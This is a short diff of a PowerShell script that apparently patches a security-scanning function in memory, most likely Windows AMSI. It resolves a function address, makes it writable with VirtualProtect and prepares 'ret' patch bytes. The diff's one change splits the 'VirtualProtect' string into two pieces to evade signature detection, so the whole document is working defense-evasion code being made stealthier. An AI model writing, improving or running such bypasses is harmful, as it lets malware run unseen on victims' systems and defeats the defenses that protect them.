@@ -61,11 +61,11 @@ $n = DecodeBase64 -encodedText $e
 $p = DecodeBase64 -encodedText $g 
 
 $notp = 0
-
+$c = 'tect'
 $LoadLibrary = [Win32]::LoadLibrary($n) 
 $notaddress = [Win32]::GetProcAddress($LoadLibrary, $p)
 
-$replace = ‘VirtualProtect’
+$replace = ‘VirtualPro'
 [Win32]::(‘{0}{1}’ -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
 $soapy = [Byte[]] (0xc3, 0x90, 0x90)
 $marshalClass = [System.Runtime.InteropServices.Marshal]
